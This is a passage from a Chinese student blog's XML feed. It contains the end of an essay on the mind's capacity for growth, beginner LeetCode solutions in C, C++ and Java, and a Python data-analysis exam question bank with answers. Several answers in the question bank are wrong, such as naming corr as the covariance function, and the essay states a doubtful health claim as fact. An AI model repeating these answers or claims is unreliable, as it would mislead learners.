人类的心智有很奇怪的一点，主要是这一点划分了我们心智与身体的截然不同。我们的身体是<strong>有限制</strong>的，心智却<strong>没有限制</strong>。其中一个迹象是，在力量与技巧上，身体不能无限制地成长。人们到了30岁左右，身体状况就达到了巅峰，随着时间的变化，身体的状况只有越来越恶化，而<strong>我们的头脑却能无限地成长与发展下去</strong>。我们的心智不会因为到了某个年纪死就停止成长，只有当大脑失去活力，僵化了，才会失去了增加技巧与理解力的力量。</p><p>　　<strong>这是人类最明显的特质，也是万物之灵与其他动物最主要不同之处。</strong>其他的动物似乎发展到某个层次之后，便不再有心智上的发展。但是人类独有的特质，却也潜藏着巨大的危险。<strong>心智就跟肌肉一样，如果不常运用就会萎缩。</strong>心智的萎缩就是在惩罚我们不经常动脑。这是个可怕的惩罚，因为证据显示，心智萎缩也可能要人的命。除此之外，似乎也没法说明为什么许多工作忙碌的人一旦退休之后就会立刻死亡。他们活着是因为工作对他们的心智上有所要求，那是一种人为的支撑力量，也就是外界的力量。一旦外界要求的力量消失之后，他们又没有内在的心智活动，他们便停止了思考，死亡也跟着来了。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> programthink </tag>
            
            <tag> 小妙招 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021暑假leetcode训练（一）</title>
      <link href="/2021/07/10/2021%E6%9A%91%E5%81%87leetcode%E8%AE%AD%E7%BB%83%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/07/10/2021%E6%9A%91%E5%81%87leetcode%E8%AE%AD%E7%BB%83%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="初级算法（一）"><a href="#初级算法（一）" class="headerlink" title="初级算法（一）"></a>初级算法（一）</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>因为还在学习C++，所以本次刷题所使用的编程语言为C。下学期我们会开一门叫做《计算机算法》的专业课，我想先提前玩一玩算法，所以就通过leetcode平台去刷题了。在每道算法题解中，我会给出一种或多种解法(我的解法和其他人比较好的解法)。</p><h2 id="删除排序数组中的重复项"><a href="#删除排序数组中的重复项" class="headerlink" title="删除排序数组中的重复项"></a>删除排序数组中的重复项</h2><p>给你一个有序数组 <code>nums</code> ，请你 <strong>原地</strong> 删除重复出现的元素，使每个元素 <strong>只出现一次</strong> ，返回删除后数组的新长度。</p><p>不要使用额外的数组空间，你必须在 <strong>原地</strong> <strong>修改输入数组</strong> 并在使用 O(1) 额外空间的条件下完成。</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>为什么返回数值是整数，但输出的答案是数组呢?</p><p>请注意，输入数组是以「引用」方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。</p><p>你可以想象内部操作如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// nums 是以“引用”方式传递的。也就是说，不对实参做任何拷贝</span><br><span class="hljs-keyword">int</span> len = removeDuplicates(nums);<br><br><span class="hljs-comment">// 在函数里修改输入数组对于调用者是可见的。</span><br><span class="hljs-comment">// 根据你的函数返回的长度, 它会打印出数组中 该长度范围内 的所有元素。</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>    print(nums[i]);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="示例-1："><a href="#示例-1：" class="headerlink" title="示例 1："></a>示例 1：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">输入：nums = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]<br>输出：<span class="hljs-number">2</span>, nums = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]<br>解释：函数应该返回新的长度 <span class="hljs-number">2</span> ，并且原数组 nums 的前两个元素被修改为 <span class="hljs-number">1</span>, <span class="hljs-number">2</span> 。不需要考虑数组中超出新长度后面的元素。<br></code></pre></td></tr></table></figure><h3 id="示例-2："><a href="#示例-2：" class="headerlink" title="示例 2："></a>示例 2：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">输入：nums = [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>输出：<span class="hljs-number">5</span>, nums = [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>解释：函数应该返回新的长度 <span class="hljs-number">5</span> ， 并且原数组 nums 的前五个元素被修改为 <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span> 。不需要考虑数组中超出新长度后面的元素。<br></code></pre></td></tr></table></figure><h3 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h3><ul><li><code>0 &lt;= nums.length &lt;= 3 * 104</code></li><li><code>-104 &lt;= nums[i] &lt;= 104</code></li><li><code>nums</code> 已按升序排列</li></ul><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">removeDuplicates</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* nums, <span class="hljs-keyword">int</span> numsSize)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(nums==<span class="hljs-literal">NULL</span>||numsSize==<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">//判断是否为空数组</span><br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> right = <span class="hljs-number">1</span>;right &lt; numsSize;right++)&#123;<br>        <span class="hljs-comment">//if(nums[left]==nums[right])</span><br>        <span class="hljs-comment">//right++;</span><br>        <span class="hljs-comment">//如果相同，左指针不动，右指针移动。因为for循环有右指针移动，故省去这步right++；</span><br>        <span class="hljs-keyword">if</span>(nums[left]!=nums[right])<br>        &#123;<br>            left++;<br>            nums[left]=nums[right];<br>        &#125;<br>        <span class="hljs-comment">//如果不相同，左指针移动，右指针将自己的值赋给左指针，再移动。</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> ++left;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="一些理解"><a href="#一些理解" class="headerlink" title="一些理解"></a>一些理解</h3><p>题中说明了数组内部已经<mark class="hl-label orange">排序</mark> 好。所以如果有重复元素，那他们一定是相邻的。故使用双指针来解决问题。只需要遍历一遍数组即可。</p><h2 id="存在重复元素"><a href="#存在重复元素" class="headerlink" title="存在重复元素"></a>存在重复元素</h2><p>给定一个整数数组，判断是否存在重复元素。</p><p>如果存在一值在数组中出现至少两次，函数返回 <code>true</code> 。如果数组中每个元素都不相同，则返回 <code>false</code> 。</p><h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">输入: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>]<br>输出: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">输入: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>输出: <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h3 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">输入: [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]<br>输出: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">containsDuplicate</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        sort(nums.begin(),nums.end());<br>        <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> right = <span class="hljs-number">1</span>;right &lt; nums.size();right++)&#123;<br>         <span class="hljs-keyword">if</span>(nums[left]==nums[right])<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span>(nums[left]!=nums[right])<br>        &#123;<br>            left++;<br>            nums[left]=nums[right];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210809234956084.png" alt="通过"></p><h3 id="一些理解-1"><a href="#一些理解-1" class="headerlink" title="一些理解"></a>一些理解</h3><p>此题查重思路同第1题相同。只是要先排序。注意在for循环中的两个if语句顺序不能写颠倒了。</p><h3 id="更好的解法"><a href="#更好的解法" class="headerlink" title="更好的解法"></a>更好的解法</h3><p>我们知道set集合中的元素是不能有重复的，在添加的时候如果有重复的，会把之前的值给覆盖，并且返回false。我们遍历数组中的所有值，一个个添加到集合set中，在添加的时候如果返回false，就表示有重复的，直接返回true。</p><pre><code>public boolean containsDuplicate(int[] nums) &#123;    Set&lt;Integer&gt; set = new HashSet&lt;&gt;();    for (int num : nums) &#123;        //因为集合set中不能有重复的元素，如果有重复的        //元素添加，就会添加失败        if (!set.add(num))            return true;    &#125;    return false;&#125;</code></pre><h2 id="拿硬币"><a href="#拿硬币" class="headerlink" title="拿硬币"></a>拿硬币</h2><p>桌上有 <code>n</code> 堆力扣币，每堆的数量保存在数组 <code>coins</code> 中。我们每次可以选择任意一堆，拿走其中的一枚或者两枚，求拿完所有力扣币的最少次数。</p><h3 id="示例-1：-1"><a href="#示例-1：-1" class="headerlink" title="示例 1："></a>示例 1：</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">输入：<span class="hljs-selector-attr">[4,2,1]</span><br><br>输出：4<br></code></pre></td></tr></table></figure><p>解释：第一堆力扣币最少需要拿 2 次，第二堆最少需要拿 1 次，第三堆最少需要拿 1 次，总共 4 次即可拿完。</p><h3 id="示例-2：-1"><a href="#示例-2：-1" class="headerlink" title="示例 2："></a>示例 2：</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">输入：<span class="hljs-selector-attr">[2,3,10]</span><br><br>输出：8<br></code></pre></td></tr></table></figure><p>限制：</p><ul><li>1 &lt;= n &lt;= 4</li><li>1 &lt;= coins[i] &lt;= 10</li></ul><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">minCount</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; coins)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> ans=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;coins.size();i++)<br>        &#123;<br>            ans+=(coins[i]+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="一些理解-2"><a href="#一些理解-2" class="headerlink" title="一些理解"></a>一些理解</h3><p>一枚硬币也要拿一次，两枚硬币也要拿一次。那么就权当拿两枚。</p><blockquote><p>作者：力扣 (LeetCode)<br>链接：<a href="https://leetcode-cn.com/">https://leetcode-cn.com/</a><br>来源：力扣（LeetCode）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 算法 </tag>
            
            <tag> c/c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python与数据分析题库</title>
      <link href="/2021/07/06/python%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E9%A2%98%E5%BA%93/"/>
      <url>/2021/07/06/python%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E9%A2%98%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章-Python与数据分析"><a href="#第一章-Python与数据分析" class="headerlink" title="第一章 Python与数据分析"></a>第一章 Python与数据分析</h2><p><strong>一、选择题</strong></p><ol><li>数据分析第三方库包括（ A B C ）</li></ol><p>A. NumPy  B. Matplotlib  C.  Pandas   D.  Pygame</p><ol start="2"><li>不是数据分析常用工具的是（ B ）</li></ol><p>A.  Python  B.  Java    C.  MATLAB  D.  R</p><p><strong>二、填空题</strong></p><ol><li><p>数据分析流程包括： 需求分析、数据获取、数据预处理、分析与建模、模型评价与优化、部署    等环节。</p></li><li><p>广义的数据分析包括    狭义数据分析  、  数据挖掘     两部分。</p></li></ol><p><strong>三、简单题</strong></p><ol><li>Python数据分析的优势。</li></ol><p>答：1. 语法简单精炼。比起其他编程语言，Python更容易学习和使用。</p><ol start="2"><li><p>功能强大的库。大量优秀好用的第三方库，扩充了Python功能，提升了Python的能力，使Python如虎添翼。</p></li><li><p>功能强大。Python是一个混合体，丰富的工具使它介于传统的脚本语言和系统语言之间。Python不仅具备简单易用的特点，还提供了编译语言所具有的软件工程能力。</p></li><li><p>不仅适用于研究和原型构建，同时也适用于构建生产系统。研究人员和工程技术人员使用同一种编程工具，会给企业带来显著的组织效益，并降低企业的运营成本。</p></li><li><p>Python是一门胶水语言。Python程序能够以多种方式轻易地与其他语言的组件“粘接”在一起，例如Python的C语言API可以帮助Python程序灵活地调用C程序。因此可以根据需要给Python程序添加功能，或者其他环境系统中使用Python。</p></li><li><p>Python数据分析环境搭建。</p></li></ol><p>答：1. 安装Python</p><ol start="2"><li>安装数据分析库</li></ol><p>（1）安装第三方数据分析库</p><p>第三方库的安装使用pip3命令，如下所示。</p><p>pip3 install numpy</p><p>pip3 install scipy</p><p>pip3 install matplotlib</p><p>pip3 install sklearn</p><p>pip3 install xlrd </p><p>pip3 install openpyxl</p><p>pip3 install seaborn</p><ol start="3"><li>Jupyter Notebook的使用</li></ol><p>Jupyter Notebook是IPython Notebook的继承者，是一个交互式笔记本，支持运行40多种编程语言。它本质上是一个支持实施代码、数学方程、可视化和Markdown的Web应用程序。对于数据分析，Jupyter Notebook最大的优点是可以重现整个分析过程，并将说明文字、代码、图表、公式和结论都整合在一个文档中。用户可以通过电子邮件、Dropbox、GitHub和Jupyter Notebook Viewer将分析结果分享给其他人。</p><p>Jupyter Notebook是一个非常强大的工具，常用于交互式地开发和展示数据科学项目。它将代码和它的输出集成到一个文档中，并且结合了可视的叙述性文本、数学方程和其他丰富的媒体。它直观的工作流促进了迭代和快速的开发，使得Jypyter notebook 在当代数据科学、分析和越来越多的科学研究中越来越受欢迎。最重要的是，作为开源项目，它是完全免费的。</p><h2 id="第二章-NumPy数值计算"><a href="#第二章-NumPy数值计算" class="headerlink" title="第二章 NumPy数值计算"></a>第二章 NumPy数值计算</h2><p><strong>一、单选题</strong></p><ol><li><p>不是NumPy数组创建的函数是（ D ）。</p><p>A. array    B. ones_like   C. eye   D. reshape</p></li><li><p>能够产生正态分布的样本值的函数是（ C ）。</p><p>A. rand  B. randint  C. randn  D. seed</p></li><li><p>求数组转置的除了使用transpose函数外，还可以使用数据的（ A ）属性。</p><p>A. T    B. shape   C. size   D. dtype</p></li></ol><p><strong>二、填空题</strong></p><ol><li><p>分割数组的函数有  split  、  hsplit 、  vsplit 。</p></li><li><p>求数组的标准差函数是 std ，方差函数是 var 。</p></li><li><p>求矩阵特征值和特征向量的函数是  eigvals()  、  eig()  。</p></li></ol><p><strong>三、简答题</strong></p><ol><li>函数unique的参数。</li></ol><p>答：</p><p>参数arr：输入数组，如果不是一维数组则会展开。</p><p>return_index：如果为true，返回新列表元素在旧列表中的位置（下标），并以列表形式储。</p><p>return_inverse：如果为true，返回旧列表元素在新列表中的位置（下标），并以列表形式储。</p><p>return_counts：如果为true，返回去重数组中的元素在原数组中的出现次数。</p><ol start="2"><li>数组可以广播的条件。</li></ol><p>答：</p><ol><li><p>数组拥有相同形状。</p></li><li><p>数组拥有相同的维数，每个维度拥有相同长度，或者长度为 1。</p></li><li><p>数组拥有极少的维度，可以在其前面追加长度为 1 的维度，使上述条件成立。</p></li><li><p>函数sort的排序算法。</p></li></ol><p>答：</p><table><thead><tr><th>种类</th><th>排序算法</th><th>最坏情况</th></tr></thead><tbody><tr><td>‘quicksort’</td><td>快速排序</td><td>O(n^2)</td></tr><tr><td>‘mergesort’</td><td>归并排序</td><td>O(n*log(n))</td></tr><tr><td>‘heapsort’</td><td>堆排序</td><td>O(n*log(n))</td></tr></tbody></table><p><strong>四、读程序</strong></p><ol><li>程序执行结果是     。<img src="/images/python/clip_image002.jpg"></li></ol><p>import numpy as np</p><p>a = np.arange(12).reshape(2,6)</p><p>c = a.ravel()</p><p>c[0]=100</p><p>print(a)</p><ol start="2"><li>程序执行结果是     。<img src="/images/python/clip_image004.jpg"></li></ol><p>import numpy as np </p><p>a = np.arange(9) </p><p>b = np.split(a,3) </p><p>print (b) </p><ol start="3"><li>程序执行结果是     。<img src="/images/python/clip_image006.jpg"></li></ol><p>import numpy as np </p><p>a = np.array([[1,2,3],[4,5,6]]) </p><p>print(np.append(a, [7,8,9]))</p><p>print(np.append(a, [[7,8,9]],axis = 0)) </p><p>print(np.append(a, [[5,5,5],[7,8,9]],axis = 1))</p><ol start="4"><li>程序执行结果是     。<img src="/images/python/clip_image008.jpg"></li></ol><p>import numpy as np </p><p>a = np.array([5,2,6,2,7,5,6,8,2,9]) </p><p>u = np.unique(a) </p><p>u,indices = np.unique(a, return_index = True) </p><p>print(indices) </p><p>u,indices = np.unique(a,return_inverse = True) </p><p>print(u) </p><p>print(indices) </p><p>print(u[indices]) </p><p>u,indices = np.unique(a,return_counts = True) </p><p>print(u)</p><p>print(indices)</p><ol start="5"><li>程序执行结果是     。<img src="/images/python/clip_image010.jpg"></li></ol><p>import numpy as np </p><p>a = np.array([10,100,1000]) </p><p>print(np.power(a,2)) </p><p>b = np.array([1,2,3]) </p><p>print(np.power(a,b))</p><ol start="6"><li>程序执行结果是  <img src="/images/python/image-20210707000306679.png">   。</li></ol><p>import numpy as np </p><p>a = np.array([[3,7],[9,1]]) </p><p>print(np.sort(a)) </p><p>print(np.sort(a, axis = 0)) </p><p>dt = np.dtype([(‘name’, ‘S10’),(‘age’, int)]) </p><p>a = np.array([(“raju”,21),(“anil”,25),(“ravi”, 17), (“amar”,27)], dtype = dt) </p><p>print(np.sort(a, order = ‘name’))</p><ol start="7"><li>程序执行结果是     。<img src="/images/python/clip_image012.jpg"></li></ol><p>import numpy as np </p><p>x = np.arange(100).reshape(10, 10) </p><p>condition = np.mod(x,2) == 0 </p><p>print(np.extract(condition, x))</p><p><strong>五、计算题</strong></p><p>1.计算下列行列式</p><p>（1）<img src="/images/python/clip_image014.gif">= <img src="/images/python/clip_image016.jpg"></p><ol start="2"><li>求下列方阵的逆矩阵</li></ol><p>（1）<img src="/images/python/clip_image018.gif">= <img src="/images/python/clip_image020.jpg"></p><p>（2）<img src="/images/python/clip_image022.gif">= <img src="/images/python/clip_image024.jpg"></p><ol start="3"><li>求下列线性方程组</li></ol><p>（1）设<img src="/images/python/clip_image026.gif">，<img src="/images/python/clip_image028.gif">，求X使AX=B；<img src="/images/python/clip_image030.jpg"></p><p>（2）<img src="/images/python/clip_image032.gif"> 无法求解。</p><ol start="4"><li>求矩阵的特征值和特征向量。</li></ol><p><img src="/images/python/clip_image034.gif"> <img src="/images/python/clip_image036.jpg"></p><h2 id="第三章-Matplotlib数据可视化"><a href="#第三章-Matplotlib数据可视化" class="headerlink" title="第三章 Matplotlib数据可视化"></a>第三章 Matplotlib数据可视化</h2><p><strong>一、选择题</strong></p><ol><li>线形图中设置线宽的函数是（ C ）</li></ol><p>A. color B. linestyle C. linewidth D. marker</p><ol start="2"><li>显示一个数据系列中各项的大小与各项总和的比例的图形时（ A ）</li></ol><p>A. 饼图 B. 直方图 C.柱形图  D. 散点图</p><ol start="3"><li>图例位置upper left对应的编号是（ A ）</li></ol><p>A. 0 B. 1 C. 2  D. 3</p><p><strong>二、填空题</strong></p><ol><li><p>绘制饼图的函数是  pie()    。</p></li><li><p>pyplot设置x坐标取值范围的函数是  xlim    。</p></li><li><p>pyplot使用rcParams设置字体的属性是 font.sans-serif  。</p></li></ol><p><strong>三、简答题</strong></p><ol><li>创建子图的函数。</li></ol><p>答：</p><p>subplot函数</p><p>函数subplot (nrows, ncols, plot_number)创建子图，其中参数nrows，ncols表示行数和列数，决定了子图的个数；plot_number表示当前是第几个子图。</p><p>subplots函数</p><p>函数plt.subplots(nrows=1, ncols=1, sharex=False, sharey=False, squeeze=True, subplot_kw=None, gridspec_kw=None,**fig_kw) </p><p>参数nrows和ncols表示将画布分割成几行几列。   </p><p>sharex和sharey表示坐标轴的属性是否相同。</p><ol start="2"><li>Matplotlib能够绘制哪些二维图形。</li></ol><p>答：折线图、散点图、柱状图、条形图、饼图、直方图、线形图等。</p><ol start="3"><li>文本注解函数。</li></ol><p>答：</p><p>（1）在任意位置增加文本</p><p>plt.text(横坐标, 纵坐标, ‘显示文字’)</p><p>（2）在图形中增加带箭头的注</p><p>plt.annotate(‘文字’,xy=(箭头坐标),xytext=(文字坐标),arrowprops=dict(facecolor=’箭头颜色’))</p><h2 id="第四章-Pandas数据分析"><a href="#第四章-Pandas数据分析" class="headerlink" title="第四章 Pandas数据分析"></a>第四章 Pandas数据分析</h2><p>一、选择题</p><ol><li>函数应用与映射函数作用于DataFrame的列的是（ A  ）</li></ol><p>A pipe  B apply  C applymap   D map</p><ol start="2"><li>重建索引函数（ D  ）</li></ol><p>A. rename  B. set_index  C. reset_index  D. reindex</p><ol start="3"><li>求协方差的函数是（ B  ）</li></ol><p>A. pct_change  B. corr  C. rank  D. cov</p><p>二、填空题</p><ol><li><p>数据对象DataFrame的head函数的作用是   返回开头前n行  。</p></li><li><p>函数read_csv的参数sep的作用是指定  分隔符  。</p></li><li><p>数据对象DataFrame选取行的函数主要是loc函数和  iloc  函数。</p></li><li><p>透视表和交叉表的函数是  pivot_table  和  crosstab  。</p></li></ol><p>三、简答题</p><ol><li>Pandas有哪些数据结构。</li></ol><p>答：Pandas有三种数据结构：系列(Series)、数据帧(DataFrame)和面板(Panel)，这些数据结构可以构建在NumPy数组之上。</p><ol start="2"><li>Pandas的统计函数。</li></ol><p>答：</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>count()</td><td>非空观测数量</td></tr><tr><td>sum()</td><td>所有值之和</td></tr><tr><td>mean()</td><td>所有值的平均值</td></tr><tr><td>median()</td><td>所有值的中位数</td></tr><tr><td>mode()</td><td>值的模值</td></tr><tr><td>std()</td><td>值的标准偏差</td></tr><tr><td>min()</td><td>所有值中的最小值</td></tr><tr><td>max()</td><td>所有值中的最大值</td></tr><tr><td>abs()</td><td>绝对值</td></tr><tr><td>prod()</td><td>数组元素的乘积</td></tr><tr><td>cumsum()</td><td>累计总和</td></tr><tr><td>cumprod()</td><td>累计乘积</td></tr><tr><td>describe</td><td>计算有关DataFrame列的统计信息的摘要</td></tr></tbody></table><p>变化率使用pct_change()函数求解，系列和DatFrames都可以通过pct_change()函数将每个元素与其前一个元素进行比较，并计算变化百分比。</p><p>Panda使用cov函数求解两个Series或DataFrame的列之间的协方差。如果数据对象中出现NaN数据，将被自动排除。</p><p>相关性DataFrame.corr(method=’pearson’, min_periods=1)</p><p>数据排名为元素数组中的每个元素生成排名，使用rank函数实现，其参数axis表示按照index（默认axis=0）还是按照column（axis=1）排名，参数methon表示排名依据：average（并列组平均排序等级）、min（组中最低的排序等级）、max（组中最高的排序等级）、first（按照它们出现在数组中的顺序分配队列）。</p><ol start="3"><li>聚合函数有哪些。</li></ol><p>答：</p><ol><li>agg方法聚合</li></ol><p>方法agg是比较常用的聚合方法，agg的参数可以是一个函数，也可以是多个函数组成的列表。</p><ol start="2"><li><p>apply方法聚合</p></li><li><p>transform方法聚合</p></li></ol><h2 id="第五章-数据预处理"><a href="#第五章-数据预处理" class="headerlink" title="第五章 数据预处理"></a>第五章 数据预处理</h2><p>一、选择题</p><ol><li>重复值删除的函数是（ A  ）</li></ol><p>A. drop_duplicates  B. duplicated C. isnull   D. notnull</p><ol start="2"><li>不是数据规范化方法的是（ D  ）</li></ol><p>A. 离差规范化  B. 标准差规范化 C. 小数定标规范化  D. 平均值规范化</p><ol start="3"><li>数据重塑方法有（ D  ）</li></ol><p>A. dropna  B. fillna  C. stack  D. concat</p><p>二、填空题</p><ol><li><p>数据清洗解决数据问题有 重复值  、 缺失值  、 异常值 。</p></li><li><p>虚拟变量的函数名称是  get_dummies  。</p></li><li><p>插值法包括  线性插值 、 多项式插值 、 样条插 。</p></li><li><p>函数merge的参数how取值有 left（左连接） 、  right（右连接） 、 outer（外连接） 和 inner（内连接） 。</p></li></ol><p>三、简答题</p><ol><li>缺失值处理方法。</li></ol><p>答：</p><p>（1）删除法</p><p>（2）固定值替换法</p><p>（3）填充法</p><p>（4）插值法</p><ol start="2"><li>数据合并连接与重塑的函数。</li></ol><p>答：</p><p>pd.merge(left, right, how=’inner’, on=None, left_on=None, right_on=None, left_index=False, right_index=False, sort=True, suffixes=(‘_x’,’_y’))</p><p>DataFrame内置的join方法是一种快速合并的方法。它默认以index作为对齐的列。左右两个DataFrame具有重复列时需要指定重复列的前缀，加以分区，使用lsuffix和rsuffix实现。</p><p>pd.concat(objs, axis=0, join=’outer’, join_axes=None, ignore_index=False,</p><p>​    keys=None, levels=None, names=None, verify_integrity=False)</p><p>combine_first合并</p><p>数据重塑是将DataFrame的行或列进行旋转的操作，函数stack将DataFrame的列旋转为行，unstack将DataFrame的行旋转为列。</p><ol start="3"><li>数据变换种类有哪些。</li></ol><p>答：</p><p>虚拟变量</p><p>函数变换</p><p>连续属性离散化</p><p>规范化</p><p>随机采样</p><h2 id="第六章-机器学习"><a href="#第六章-机器学习" class="headerlink" title="第六章 机器学习"></a>第六章 机器学习</h2><p>一、选择题</p><ol><li>监督学习包括（ B、C  ）</li></ol><p>A. 降维  B. 回归 C. 分类   D. 聚类</p><ol start="2"><li>鸢尾花数据集属于（ A  ）</li></ol><p>A. load数据集  B. make数据集 C. 可在线下载的数据集 D. svmlight/libsvm格式的数据集</p><ol start="3"><li>数据集拆分为训练集和测试集的函数是（ D  ）</li></ol><p>A. cross_val_score B. PCA  C. 